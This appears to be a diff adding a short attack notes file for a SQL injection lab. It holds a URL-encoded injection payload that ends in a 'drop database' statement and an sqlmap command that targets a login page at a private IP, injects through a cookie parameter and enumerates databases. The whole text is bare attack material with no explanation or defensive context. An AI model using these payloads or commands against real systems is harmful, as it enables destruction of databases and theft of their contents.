@@ -1,0 +1,3 @@
+\" OR TRUE%3B drop database delete_me--%20
+
+qlmap --flush-session -u  "http://192.168.111.136/navigate/login.php" --cookie="navigate-user=low" -p "navigate-user" --method POST --level 2 --dbs     
